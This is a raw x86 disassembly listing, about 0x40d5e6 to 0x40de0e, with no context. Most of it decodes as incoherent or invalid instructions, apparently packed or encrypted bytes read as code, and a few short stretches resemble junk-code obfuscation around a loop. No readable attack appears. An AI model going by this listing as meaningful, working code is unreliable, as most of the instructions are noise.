  40d5e6:	push   esi
  40d5e7:	lock or al,BYTE PTR [edi+0x76]
  40d5eb:	ror    DWORD PTR [eax],1
  40d5ed:	mov    ebp,0x23761d06
  40d5f2:	gs inc ebx
  40d5f4:	js     0x40d587
  40d5f6:	mov    bh,0xaa
  40d5f8:	jae    0x40d5fe
  40d5fa:	xchg   ebp,eax
  40d5fb:	jle    0x40d5e5
  40d5fd:	neg    BYTE PTR [eax]
  40d5ff:	xor    BYTE PTR [ecx+0x76435c9a],ah
  40d605:	and    bl,BYTE PTR [ebp-0x1fe3361c]
  40d60b:	mov    bh,ah
  40d60d:	ret    
  40d60e:	retf   0xa6a8
  40d611:	xchg   ebx,eax
  40d612:	fwait
  40d613:	add    DWORD PTR [eax+0x423fb2e4],ecx
  40d619:	fild   QWORD PTR [eax]
  40d61b:	in     al,0x12
  40d61d:	mov    BYTE PTR [eax+0x76d9032b],cl
  40d623:	lods   al,BYTE PTR ds:[esi]
  40d624:	mov    edi,0x52fbc79a
  40d629:	xchg   ebp,eax
  40d62a:	sbb    eax,0x618a4bef
  40d62f:	xor    ah,BYTE PTR [edi-0x34657678]
  40d635:	push   esp
  40d636:	xor    ebp,edx
  40d638:	enter  0x789e,0x35
  40d63c:	sbb    al,0xe7
  40d63e:	bound  eax,QWORD PTR [edi+0x1bc4983d]
  40d644:	jl     0x40d671
  40d646:	shl    DWORD PTR [esi],1
  40d648:	pop    ss
  40d649:	cld    
  40d64a:	jmp    0x40d624
  40d64c:	jmp    0x40d68f
  40d64e:	stos   DWORD PTR es:[edi],eax
  40d64f:	push   cs
  40d650:	bound  esi,QWORD PTR [ecx-0x51]
  40d653:	(bad)  
  40d654:	cmp    DWORD PTR [ecx],esi
  40d656:	and    DWORD PTR [ebp+0x7500cbc2],0xffffff86
  40d65d:	mov    ds:0xa81c722d,eax
  40d662:	jl     0x40d651
  40d664:	in     eax,0x25
  40d666:	in     eax,0xe6
  40d668:	adc    DWORD PTR [esi-0x2483763a],edi
  40d66e:	fdivr  QWORD PTR [edx]
  40d670:	mov    cl,0x3e
  40d672:	jmp    0x40d659
  40d674:	jmp    0x236e:0x5b27d8f
  40d67b:	dec    eax
  40d67c:	dec    edx
  40d67d:	bound  edx,QWORD PTR [eax+0x17]
  40d680:	or     eax,0x72c56d35
  40d685:	mov    al,ds:0x3fc8bea8
  40d68a:	inc    edi
  40d68b:	call   0xbd5fc626
  40d690:	dec    ebx
  40d691:	push   ebp
  40d692:	jnp    0x40d638
  40d694:	push   esi
  40d695:	jmp    0x3675:0xa1954953
  40d69c:	mov    al,0x4d
  40d69e:	mov    cl,0xb0
  40d6a0:	sbb    ch,ah
  40d6a2:	pop    ss
  40d6a3:	xchg   esp,eax
  40d6a4:	mov    ds:0xee8c285c,al
  40d6a9:	mov    ecx,0xccf7c9ce
  40d6ae:	pop    ecx
  40d6af:	or     dl,BYTE PTR ds:0xfae174ef
  40d6b5:	into   
  40d6b6:	dec    BYTE PTR [ecx+0x7d66155]
  40d6bc:	push   es
  40d6bd:	div    DWORD PTR [edi-0x60534e2a]
  40d6c3:	ja     0x40d6fa
  40d6c5:	push   ebx
  40d6c6:	pop    ds
  40d6c7:	cmp    edx,DWORD PTR [ebx-0x56d3afc4]
  40d6cd:	fld    DWORD PTR [edx+ecx*2+0x22]
  40d6d1:	xchg   ebp,eax
  40d6d2:	mov    ds:0x3027b2d3,al
  40d6d7:	test   ecx,esi
  40d6d9:	jmp    0x1708:0xbf38b3b0
  40d6e0:	aam    0x4d
  40d6e2:	sbb    DWORD PTR [ebx-0x7af26958],0xb9c3efec
  40d6ec:	mov    edx,0x5c29d937
  40d6f1:	ins    BYTE PTR es:[edi],dx
  40d6f2:	push   0xfffffffa
  40d6f4:	mov    DWORD PTR ds:[ebp+0x434171b6],0x6bb6c19f
  40d6ff:	xlat   BYTE PTR ds:[ebx]
  40d700:	jecxz  0x40d69e
  40d702:	cmp    esp,DWORD PTR [ebx-0xeecce7]
  40d708:	mov    bh,0xa7
  40d70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d70b:	xchg   ebx,eax
  40d70c:	pop    esp
  40d70d:	jge    0x40d73e
  40d70f:	push   edi
  40d710:	lods   al,BYTE PTR ds:[esi]
  40d711:	ds cs leave 
  40d714:	xor    BYTE PTR [ecx-0x2c],dh
  40d717:	adc    eax,0x4c50d281
  40d71c:	ss push ebp
  40d71e:	cmp    BYTE PTR [edx],ah
  40d720:	je     0x40d6f4
  40d722:	jb     0x40d753
  40d724:	mov    cl,0x55
  40d726:	cld    
  40d727:	jno    0x40d6e3
  40d729:	pop    ss
  40d72a:	ret    0x9f91
  40d72d:	push   edx
  40d72e:	(bad)  
  40d72f:	mov    ebx,0x30d6e8c0
  40d734:	add    ecx,edx
  40d736:	int    0x7c
  40d738:	dec    ebx
  40d739:	push   edi
  40d73a:	pushf  
  40d73b:	jmp    0x33f7ec65
  40d740:	inc    esi
  40d741:	in     eax,dx
  40d742:	jge    0x40d749
  40d744:	inc    edi
  40d745:	aas    
  40d746:	and    BYTE PTR [eax-0x70ae033b],0xd1
  40d74d:	xor    eax,0xddc90d01
  40d752:	mov    ds:0xb611c87,al
  40d757:	inc    ecx
  40d758:	add    dh,BYTE PTR [ebx-0x3ee83085]
  40d75e:	cld    
  40d75f:	(bad)  
  40d760:	shl    DWORD PTR [esi-0x2322ef3c],1
  40d766:	into   
  40d767:	inc    ebx
  40d768:	dec    edx
  40d769:	sub    al,0x3e
  40d76b:	xor    BYTE PTR [eax-0x4d],bh
  40d76e:	fidivr WORD PTR [ecx]
  40d770:	sbb    DWORD PTR [ecx],edi
  40d772:	xchg   esi,eax
  40d773:	add    esi,edx
  40d775:	and    ebx,DWORD PTR [esi-0x3f]
  40d778:	jb     0x40d723
  40d77a:	shr    DWORD PTR [esi+ebx*4+0x34],cl
  40d77e:	into   
  40d77f:	jne    0x40d790
  40d781:	in     eax,0x51
  40d783:	add    BYTE PTR [ebx-0x6f],dh
  40d786:	xor    DWORD PTR [esi-0x7fd20bc2],ebp
  40d78c:	cmp    DWORD PTR [ebp+0x5bb5ae98],ebp
  40d792:	out    0x5b,al
  40d794:	adc    edi,DWORD PTR [ebp-0x62]
  40d797:	adc    eax,0xb5ec5503
  40d79c:	out    dx,eax
  40d79d:	out    dx,eax
  40d79e:	add    al,0x87
  40d7a0:	xor    cl,BYTE PTR [ebp+0x7]
  40d7a3:	fucomip st,st(3)
  40d7a5:	clc    
  40d7a6:	je     0x40d823
  40d7a8:	bswap  eax
  40d7aa:	xchg   ebx,eax
  40d7ab:	(bad)  
  40d7ac:	and    ecx,ecx
  40d7ae:	outs   dx,DWORD PTR ds:[esi]
  40d7af:	mov    WORD PTR [edx],es
  40d7b1:	test   ebp,esi
  40d7b3:	test   ebx,0x921392a5
  40d7b9:	add    bp,di
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x32151ba3]
  40d7eb:	gs xchg esp,eax
  40d7ed:	pop    ecx
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	add    DWORD PTR [eax+eiz*8+0x6d55e2ba],ebp
  40d7fc:	pop    ebp
  40d7fd:	mov    ecx,0xccc88f98
  40d802:	pop    ebp
  40d803:	rol    DWORD PTR [eax+0x2d47f992],0x1f
  40d80a:	lds    ecx,FWORD PTR [ecx-0x7462b1a7]
  40d810:	adc    cl,bl
  40d812:	adc    eax,0x4b625860
  40d817:	in     eax,0xc2
  40d819:	outs   dx,DWORD PTR ds:[esi]
  40d81a:	lods   eax,DWORD PTR ds:[esi]
  40d81b:	(bad)  [ebx-0x3a9c2d13]
  40d821:	jnp    0x40d7e6
  40d823:	ror    BYTE PTR [ebx-0x33],1
  40d826:	popf   
  40d827:	test   eax,0x37a3ab8b
  40d82c:	pop    edx
  40d82d:	mov    ebp,0x35078145
  40d832:	fs iret 
  40d834:	inc    edx
  40d835:	out    dx,al
  40d836:	repnz inc edx
  40d838:	pusha  
  40d839:	jge    0x40d7cf
  40d83b:	dec    ebp
  40d83c:	xor    eax,0x78a869a9
  40d841:	inc    eax
  40d842:	jmp    0xd775:0xa1467608
  40d849:	sub    edx,esp
  40d84b:	mov    ch,0x50
  40d84d:	or     DWORD PTR [eax],ecx
  40d84f:	push   cs
  40d850:	and    DWORD PTR [ebx+0x7b838583],esp
  40d856:	push   esi
  40d857:	or     edi,0xb6960a2b
  40d85d:	pop    ebx
  40d85e:	mov    edx,0xb2cbe0ac
  40d863:	jno    0x40d8a8
  40d865:	ror    bl,0x61
  40d868:	ja     0x40d817
  40d86a:	test   DWORD PTR [eax],esp
  40d86c:	mov    esp,0x378b0ec
  40d871:	cmp    al,0x1b
  40d873:	or     al,0x55
  40d875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d876:	sbb    DWORD PTR [edi-0x2b],ecx
  40d879:	sbb    bl,0x72
  40d87c:	popf   
  40d87d:	sub    eax,0xe12a0cc9
  40d882:	sbb    eax,0x5aad078b
  40d887:	dec    eax
  40d888:	xor    al,0xb9
  40d88a:	xor    BYTE PTR [edi-0x62],0xd5
  40d88e:	std    
  40d88f:	xchg   BYTE PTR [ebx-0x1e6a9b18],bl
  40d895:	pop    esi
  40d896:	pop    ds
  40d897:	mov    ebp,0x9bf00d87
  40d89c:	mov    al,ds:0x3ad77ed8
  40d8a1:	fild   DWORD PTR [edx]
  40d8a3:	xor    eax,0xde2b1cb5
  40d8a8:	rol    BYTE PTR [ecx],0xe7
  40d8ab:	adc    ebp,DWORD PTR [ebp+0x646dbafd]
  40d8b1:	pop    edx
  40d8b2:	and    BYTE PTR [esi+0x2e],ch
  40d8b5:	mov    ebp,0x430b0118
  40d8ba:	les    eax,FWORD PTR [ecx+0x7a]
  40d8bd:	pusha  
  40d8be:	clc    
  40d8bf:	(bad)  
  40d8c0:	mov    dh,0x29
  40d8c2:	sub    al,0xf6
  40d8c4:	lds    ebx,FWORD PTR [ecx+ecx*1-0x4db346e0]
  40d8cb:	sub    DWORD PTR [ecx-0x2e],eax
  40d8ce:	or     BYTE PTR [edx+0x25fd59fd],al
  40d8d4:	mov    eax,0x4e7bb46a
  40d8d9:	(bad)  
  40d8da:	jl     0x40d8c2
  40d8dc:	cmc    
  40d8dd:	xor    BYTE PTR [ecx+0x791634ba],0x73
  40d8e4:	cwde   
  40d8e5:	sbb    eax,0x1da90b41
  40d8ea:	mov    eax,0x61529e29
  40d8ef:	(bad)  [eax]
  40d8f1:	add    DWORD PTR [edx+0xb],ecx
  40d8f4:	pop    ecx
  40d8f5:	dec    esp
  40d8f6:	out    dx,eax
  40d8f7:	loopne 0x40d8fc
  40d8f9:	(bad)  
  40d8fa:	sbb    DWORD PTR [ebx+ebx*8+0x57069bb0],esp
  40d901:	retf   0xb3a3
  40d904:	cmc    
  40d905:	jne    0x40d8c8
  40d907:	lods   al,BYTE PTR ds:[esi]
  40d908:	retf   
  40d909:	mov    dl,0xed
  40d90b:	mov    eax,ds:0x7ad02556
  40d910:	cwde   
  40d911:	cmc    
  40d912:	cmp    eax,0xcefc5e41
  40d917:	push   cs
  40d918:	popa   
  40d919:	xchg   ecx,eax
  40d91a:	jo     0x40d902
  40d91c:	inc    ebx
  40d91d:	mov    al,ds:0x313f7f76
  40d922:	add    eax,0xa3b9a5ae
  40d927:	xchg   esp,eax
  40d928:	(bad)
  40d92b:	jbe    0x40d969
  40d92d:	jle    0x40d93f
  40d92f:	mov    ah,0x83
  40d931:	mov    edi,0x439634f7
  40d936:	js     0x40d910
  40d938:	pusha  
  40d939:	mov    eax,ds:0x4e556320
  40d93e:	cmc    
  40d93f:	mov    bh,0xa1
  40d941:	fs sub dh,al
  40d944:	jmp    0xcfc1:0x4cc110b7
  40d94b:	jae    0x40d8f0
  40d94d:	push   edx
  40d94e:	and    eax,0x6eb8c92c
  40d953:	dec    edi
  40d954:	ficom  DWORD PTR [ebp+0x3fe535c5]
  40d95a:	fadd   QWORD PTR [ebp+ebp*2-0x5]
  40d95e:	and    cl,BYTE PTR [edx-0x17dc9cfe]
  40d964:	fstp   DWORD PTR [edx]
  40d966:	sbb    esi,DWORD PTR [ebp+0x211b9b3d]
  40d96c:	repz push 0x2f
  40d96f:	add    ch,ah
  40d971:	fdiv   st(2),st
  40d973:	fld    TBYTE PTR [ebx+edx*4-0x1e]
  40d977:	test   eax,0xacb485c1
  40d97c:	dec    esi
  40d97d:	jle    0x40d9cf
  40d97f:	or     cl,BYTE PTR [ebp-0x59f1b615]
  40d985:	adc    DWORD PTR gs:[edx+0x23],ebx
  40d989:	lds    edi,FWORD PTR [ecx-0x709b89e4]
  40d98f:	call   0x75d1:0xee8f6ba
  40d996:	call   0xf70a305b
  40d99b:	fbld   TBYTE PTR [esi-0x46]
  40d99e:	inc    ecx
  40d99f:	push   edi
  40d9a0:	out    dx,al
  40d9a1:	push   ss
  40d9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9a3:	fild   QWORD PTR cs:[edi-0x7a]
  40d9a7:	adc    BYTE PTR [ebx+0x56459a43],ch
  40d9ad:	push   ss
  40d9ae:	xor    al,0xec
  40d9b0:	pop    ebp
  40d9b1:	push   eax
  40d9b2:	or     dl,BYTE PTR [edi]
  40d9b4:	lock dec cx
  40d9b7:	test   eax,0x9cb5b733
  40d9bc:	call   0x6b4e:0xce832871
  40d9c3:	xchg   ebp,eax
  40d9c4:	imul   eax,DWORD PTR [edx+0x7f52cccd],0x83c4d3c0
  40d9ce:	mov    ds:0x874d6e9e,al
  40d9d3:	es stc 
  40d9d5:	cmc    
  40d9d6:	shr    BYTE PTR [eax-0x3c34bb73],cl
  40d9dc:	cmp    DWORD PTR [eax-0x66a5093b],edi
  40d9e2:	or     al,0xec
  40d9e4:	mov    edx,0x39d7d107
  40d9e9:	mov    dh,0xac
  40d9eb:	pop    esp
  40d9ec:	xor    eax,0x42fe55f6
  40d9f1:	add    eax,0xe101fa2
  40d9f6:	fdiv   QWORD PTR [esi]
  40d9f8:	jge    0x40da11
  40d9fa:	scas   al,BYTE PTR es:[edi]
  40d9fb:	sub    esp,DWORD PTR cs:[edx+0x16]
  40d9ff:	mov    dh,0x60
  40da01:	xlat   BYTE PTR ds:[ebx]
  40da02:	(bad)  
  40da03:	pop    ss
  40da04:	push   ecx
  40da05:	dec    edi
  40da06:	aam    0x9a
  40da08:	addr16 aad 0x23
  40da0b:	(bad)  
  40da0c:	xor    al,0x6f
  40da0e:	(bad)  
  40da0f:	loope  0x40d9d7
  40da11:	iret   
  40da12:	mov    al,0x6a
  40da14:	lds    eax,FWORD PTR [ebx-0x2fdf5921]
  40da1a:	loopne 0x40d9ba
  40da1c:	dec    ecx
  40da1d:	adc    DWORD PTR [esi+edi*8-0x27],edi
  40da21:	adc    al,0x5e
  40da23:	pop    edx
  40da24:	xchg   esi,eax
  40da25:	mov    BYTE PTR ds:0x8705bf20,bl
  40da2b:	adc    DWORD PTR [esi-0x7cde9cf0],eax
  40da31:	or     BYTE PTR gs:[eax],al
  40da34:	mov    eax,ds:0x42a831
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	imul   esp,DWORD PTR [esi+0x79],0x78ae1642
  40da84:	js     0x40dabb
  40da86:	jle    0x40db00
  40da88:	js     0x40da63
  40da8a:	push   esi
  40da8b:	fidiv  DWORD PTR [eax]
  40da8d:	aaa    
  40da8e:	loop   0x40da9d
  40da90:	jmp    0x40da80
  40da92:	adc    eax,0xd49e2d9d
  40da97:	fwait
  40da98:	jl     0x40dafd
  40da9a:	jge    0x40da5b
  40da9c:	adc    BYTE PTR [esi],dl
  40da9e:	mov    edi,esp
  40daa0:	sbb    al,0xb2
  40daa2:	scas   al,BYTE PTR es:[edi]
  40daa3:	ins    BYTE PTR es:[edi],dx
  40daa4:	mov    ds:0xb94d9f1,eax
  40daa9:	in     al,dx
  40daaa:	pop    ebp
  40daab:	adc    al,0xb9
  40daad:	push   esi
  40daae:	add    DWORD PTR [esi],edx
  40dab0:	(bad)  
  40dab1:	icebp  
  40dab2:	cmp    BYTE PTR [ebx+0x236e5cc1],0x7c
  40dab9:	loop   0x40da55
  40dabb:	or     DWORD PTR cs:0x30b97315,esi
  40dac2:	jb     0x40db22
  40dac4:	lea    esp,ds:0xcaab43c8
  40daca:	xor    DWORD PTR [edi+0x35cb5730],edi
  40dad0:	je     0x40daf4
  40dad2:	repnz fistp WORD PTR [esi+0xdac191d]
  40dad9:	and    al,0x47
  40dadb:	xchg   ecx,eax
  40dadc:	push   cs
  40dadd:	push   cs
  40dade:	and    edi,DWORD PTR [edx-0x59]
  40dae1:	mov    ebx,0xd4eafc80
  40dae6:	imul   ebp,DWORD PTR [edi],0x16
  40dae9:	out    0x47,eax
  40daeb:	out    0xbe,al
  40daed:	scas   al,BYTE PTR es:[edi]
  40daee:	enter  0xf552,0x7a
  40daf2:	pop    ebx
  40daf3:	in     al,0x7b
  40daf5:	repnz xor eax,0xd0af7767
  40dafb:	xor    BYTE PTR [eax+ebp*4-0x32fef1d1],cl
  40db02:	cmp    dl,BYTE PTR [edi+0x3216edf7]
  40db08:	lods   eax,DWORD PTR ds:[esi]
  40db09:	pop    ss
  40db0a:	je     0x40dac5
  40db0c:	add    eax,0xb5236baf
  40db11:	loop   0x40dad9
  40db13:	imul   DWORD PTR [edi]
  40db15:	add    DWORD PTR [edi-0x47],esp
  40db18:	call   0xa018:0xb9c1
  40db1e:	xchg   dl,al
  40db20:	mov    esp,0xe41f096e
  40db25:	xor    DWORD PTR [ebp+0x56],esp
  40db28:	inc    ecx
  40db29:	sub    eax,0xecd6069e
  40db2e:	fldenv [esi]
  40db30:	aad    0xec
  40db32:	cmp    bl,BYTE PTR [eax+esi*2-0x3b]
  40db36:	sub    al,BYTE PTR [ebp+0x34]
  40db39:	xchg   BYTE PTR [edx+0x51],cl
  40db3c:	out    0x19,eax
  40db3e:	lahf   
  40db3f:	and    eax,0x2382973c
  40db44:	call   0xafedcc77
  40db49:	iret   
  40db4a:	or     BYTE PTR [edi+0x3],ah
  40db4d:	jmp    0xdd3b32e9
  40db52:	inc    edi
  40db53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db54:	not    esp
  40db56:	jmp    0x1fee6eac
  40db5b:	dec    ecx
  40db5c:	or     al,0xe1
  40db5e:	(bad)  
  40db60:	sbb    ebx,esp
  40db62:	jns    0x40db06
  40db64:	push   es
  40db65:	es icebp 
  40db67:	push   edi
  40db68:	dec    edi
  40db69:	leave  
  40db6a:	mov    cl,0x4
  40db6c:	push   0x48
  40db6e:	xchg   edi,eax
  40db6f:	xchg   ebx,eax
  40db70:	sbb    DWORD PTR [ebx-0x5dd92ca2],0xedd1af92
  40db7a:	sbb    eax,0x1bbe0672
  40db7f:	leave  
  40db80:	push   ss
  40db81:	(bad)  
  40db82:	icebp  
  40db83:	fnstsw ax
  40db85:	pop    ebx
  40db86:	repnz and al,0x4d
  40db89:	dec    ebx
  40db8a:	xchg   ebx,ebx
  40db8c:	xchg   ebx,eax
  40db8d:	mov    ebx,0x50a22762
  40db92:	mov    esi,DWORD PTR [esi]
  40db94:	inc    esp
  40db95:	mov    ecx,0xf5209e23
  40db9a:	icebp  
  40db9b:	mov    ah,0x1c
  40db9d:	xor    bl,BYTE PTR [eax-0x1d]
  40dba0:	sub    BYTE PTR [ebx+0x2c8517c],bl
  40dba6:	ret    0x7da6
  40dba9:	jnp    0x40db8f
  40dbab:	pop    ds
  40dbac:	sahf   
  40dbad:	sub    cl,cl
  40dbaf:	call   0x6ba8:0x3ad8e36a
  40dbb6:	jne    0x40dbc9
  40dbb8:	mov    edx,0x6e223f02
  40dbbd:	std    
  40dbbe:	or     al,0x8a
  40dbc0:	pop    es
  40dbc1:	(bad)  
  40dbc2:	into   
  40dbc3:	(bad)  
  40dbc4:	loope  0x40dbcd
  40dbc6:	or     edi,DWORD PTR [ebp-0x6d]
  40dbc9:	xor    ah,BYTE PTR [ecx+0x193b3989]
  40dbcf:	and    DWORD PTR [ecx-0x76],ecx
  40dbd2:	add    dh,bl
  40dbd4:	xor    eax,ebp
  40dbd6:	inc    esp
  40dbd7:	sahf   
  40dbd8:	ror    DWORD PTR [edi],1
  40dbda:	inc    eax
  40dbdb:	rcr    bh,0xd7
  40dbde:	shl    esp,0x98
  40dbe1:	or     bh,BYTE PTR [edi+0x3ec61eca]
  40dbe7:	sar    edi,1
  40dbe9:	xchg   ecx,eax
  40dbea:	in     al,dx
  40dbeb:	jmp    0x40dbaf
  40dbed:	(bad)  
  40dbef:	test   al,0x4b
  40dbf1:	mov    DWORD PTR ds:0x5f0af19c,eax
  40dbf7:	mov    ds:0x14f54a92,eax
  40dbfc:	and    bh,BYTE PTR [eax-0xcfeedac]
  40dc02:	loopne 0x40dc4a
  40dc04:	(bad)  
  40dc05:	jo     0x40dc64
  40dc07:	je     0x40dc60
  40dc09:	aas    
  40dc0a:	or     DWORD PTR [edi+0x3b],edi
  40dc0d:	mov    eax,0x12558610
  40dc12:	dec    esi
  40dc13:	jmp    DWORD PTR [ebp+edx*8+0x7b2dae5e]
  40dc1a:	adc    bl,BYTE PTR [esi-0x33ee101f]
  40dc20:	(bad)
  40dc23:	lea    edx,[edx+0x51]
  40dc26:	mov    ebx,0x65a87cfc
  40dc2b:	retf   
  40dc2c:	ins    DWORD PTR es:[edi],dx
  40dc2d:	add    esi,DWORD PTR [ebx-0x26]
  40dc30:	push   esp
  40dc31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc32:	inc    ecx
  40dc33:	and    esi,DWORD PTR [ebp+0x6]
  40dc36:	loope  0x40dbcf
  40dc38:	xor    DWORD PTR [ebx+edi*4],0xffffffd8
  40dc3c:	xor    al,0x16
  40dc3e:	inc    esp
  40dc3f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40dc41:	jl     0x40dbe0
  40dc43:	sbb    ebx,0xffffff87
  40dc46:	jnp    0x40dc9f
  40dc48:	fiadd  WORD PTR [ecx+0x67563372]
  40dc4e:	push   cs
  40dc4f:	mov    BYTE PTR [edx-0x5d],cl
  40dc52:	icebp  
  40dc53:	mov    bl,0xe4
  40dc55:	jnp    0x40dc9c
  40dc57:	ret    
  40dc58:	mov    eax,ecx
  40dc5a:	scas   al,BYTE PTR es:[edi]
  40dc5b:	sti    
  40dc5c:	and    bl,cl
  40dc5e:	jmp    0x40dcd8
  40dc60:	lahf   
  40dc61:	push   esp
  40dc62:	cdq    
  40dc63:	dec    esi
  40dc64:	push   ss
  40dc65:	mov    bl,0xbf
  40dc67:	jp     0x40dcd8
  40dc69:	scas   eax,DWORD PTR es:[edi]
  40dc6a:	xchg   edi,eax
  40dc6b:	retf   0xb7d7
  40dc6e:	jns    0x40dbfa
  40dc70:	shl    BYTE PTR [edi],1
  40dc72:	psubw  mm5,QWORD PTR [eax]
  40dc75:	mov    fs,esp
  40dc77:	cmp    bh,BYTE PTR [eax]
  40dc79:	or     bl,BYTE PTR [edx-0x351247c7]
  40dc7f:	xchg   ebp,eax
  40dc80:	push   eax
  40dc81:	rol    BYTE PTR [eax+0x399bfa6b],0xd0
  40dc88:	or     edi,DWORD PTR [ebx-0x2c]
  40dc8b:	aaa    
  40dc8c:	in     al,0x15
  40dc8e:	jmp    0x40dca7
  40dc90:	ins    BYTE PTR es:[edi],dx
  40dc91:	push   0xffffffff
  40dc93:	clc    
  40dc94:	bound  esi,QWORD PTR [edi+eiz*4+0x7d3dca1a]
  40dc9b:	in     eax,dx
  40dc9c:	lock fucomp st(7)
  40dc9f:	inc    ecx
  40dca0:	je     0x40dc84
  40dca2:	js     0x40dcda
  40dca4:	sti    
  40dca5:	cmp    BYTE PTR [ecx+0x2f],al
  40dca8:	arpl   WORD PTR [esi+0x43ef04ef],cx
  40dcae:	add    edx,DWORD PTR [edx-0xdb8aca9]
  40dcb4:	sbb    DWORD PTR [ecx+edx*2],edx
  40dcb7:	out    dx,al
  40dcb8:	xchg   ecx,eax
  40dcb9:	cmc    
  40dcba:	push   DWORD PTR [ecx+ebp*8-0x5e]
  40dcbe:	mov    ebx,0x2bb521f4
  40dcc3:	add    eax,DWORD PTR gs:[ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	mov    edi,0xd3156383
  40dd68:	lods   al,BYTE PTR ds:[esi]
  40dd69:	js     0x40dde3
  40dd6b:	xor    eax,0x2778787e
  40dd70:	pop    eax
  40dd71:	xchg   ecx,eax
  40dd72:	sbb    al,0x46
  40dd74:	dec    edi
  40dd75:	jae    0x40dd67
  40dd77:	push   cs
  40dd78:	jecxz  0x40ddf3
  40dd7a:	mov    BYTE PTR [ebx-0x31],dl
  40dd7d:	lods   eax,DWORD PTR ds:[esi]
  40dd7e:	into   
  40dd7f:	imul   eax,DWORD PTR [edi+0x74bae844],0x9eb08143
  40dd89:	fidiv  DWORD PTR [eax-0x69]
  40dd8c:	imul   edi,DWORD PTR [edi+0xd],0x7b
  40dd90:	cdq    
  40dd91:	jae    0x40ddf6
  40dd93:	xchg   DWORD PTR [edi],esi
  40dd95:	jg     0x40dd2d
  40dd97:	stc    
  40dd98:	cmp    DWORD PTR [edi-0x66e50419],esi
  40dd9e:	pop    ebx
  40dd9f:	(bad)  
  40dda0:	loop   0x40dd8a
  40dda2:	xchg   edi,eax
  40dda3:	hlt    
  40dda4:	xor    dh,BYTE PTR [edi-0x70]
  40dda7:	test   al,0x90
  40dda9:	inc    esp
  40ddaa:	push   ebp
  40ddab:	jle    0x40ddf8
  40ddad:	clc    
  40ddae:	mov    eax,ds:0xcd5f8199
  40ddb3:	popf   
  40ddb4:	test   dh,bh
  40ddb6:	ins    DWORD PTR es:[edi],dx
  40ddb7:	xchg   ecx,eax
  40ddb8:	xchg   edi,eax
  40ddb9:	ins    DWORD PTR es:[edi],dx
  40ddba:	stc    
  40ddbb:	xor    ch,al
  40ddbd:	pusha  
  40ddbe:	mov    eax,ds:0xcf213602
  40ddc3:	mov    ebp,0x4eac94f0
  40ddc8:	adc    DWORD PTR [edx],0xea80133f
  40ddce:	nop
  40ddcf:	inc    esp
  40ddd0:	push   ebp
  40ddd1:	cs mov eax,0xc19fd5a5
  40ddd7:	dec    eax
  40ddd8:	mov    DWORD PTR [ebp+edx*2+0x6cc51f8d],ecx
  40dddf:	mov    dh,0xca
  40dde1:	sti    
  40dde2:	dec    ebp
  40dde3:	pushf  
  40dde4:	jmp    0x40de11
  40dde6:	stos   DWORD PTR es:[edi],eax
  40dde7:	mov    ch,0xda
  40dde9:	in     eax,0x13
  40ddeb:	fimul  DWORD PTR [edi]
  40dded:	js     0x40ddbd
  40ddef:	das    
  40ddf0:	aaa    
  40ddf1:	cmp    esp,DWORD PTR [edi+edi*8]
  40ddf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddf5:	sub    DWORD PTR [ebp+0x2a38ca50],ebp
  40ddfb:	test   BYTE PTR [eax+0x56e3b87],dl
  40de01:	aad    0x7b
  40de03:	jae    0x40de24
  40de05:	mov    BYTE PTR [edx+0x5244c18f],cl
  40de0b:	pop    esi
  40de0c:	popf   
  40de0d:	scas   al,BYTE PTR es:[edi]
  40de0e:	cld    
